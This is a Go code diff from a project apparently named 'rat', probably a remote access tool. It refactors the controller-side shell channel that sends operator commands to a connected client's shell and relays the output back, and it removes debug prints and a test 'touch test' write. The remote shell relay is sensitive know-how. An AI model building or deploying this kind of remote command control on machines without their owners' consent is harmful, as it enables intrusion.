@@ -4,13 +4,12 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"rat/shared"
 	"rat/shared/network/header"
-
-	"golang.org/x/net/websocket"
 )
 
 type ShellChannel struct {
-	ws *websocket.Conn
+	controller *Controller
 }
 
 func (ShellChannel) Header() header.PacketHeader {
@@ -18,26 +17,29 @@ func (ShellChannel) Header() header.PacketHeader {
 }
 
 func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
-	/* 	if ws, ok := c.Listeners[header.ShellHeader]; ok {
-		return sendMessage(ws, c, ShellCommandMessage{packet.Command})
-	} */
-
-	channel.Write([]byte("touch test\n"))
-
 	defer channel.Close()
-	listener := c.Listen()
+	listener := data.controller.Listen(ShellEvent, c)
 	defer listener.Unlisten()
 	go func() {
 		for {
-			m := <-listener.C
+			select {
+			case m := <-listener.C:
+				if m == nil {
+					break
+				}
 
-			if m == nil {
-				break
-			}
-
-			if msg, ok := m.(*ShellMessage); ok {
-				fmt.Println("control > command", msg.Command, []byte(msg.Command))
-				channel.Write([]byte(msg.Command))
+				if msg, ok := m.(*ShellMessage); ok {
+					switch msg.Action {
+					case shared.WriteShell:
+						channel.Write([]byte(msg.Data))
+					case shared.StopShell:
+						channel.Close()
+						return
+					}
+				}
+			case <-data.controller.die:
+				channel.Close()
+				return
 			}
 		}
 	}()
@@ -46,13 +48,15 @@ func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
 	b := make([]byte, 1024)
 	for {
 		n, err := r.Read(b)
-		fmt.Println("client > command", err, string(b[:n]), b[:n])
 		if err != nil {
 			break
 		}
 
-		sendMessage(data.ws, c, ShellCommandMessage{string(b[:n])})
+		sendMessage(data.controller, c, ShellCommandMessage{string(b[:n])})
 	}
+
+	fmt.Println("ending channel on command side")
+	channel.Close()
 
 	return nil
 }
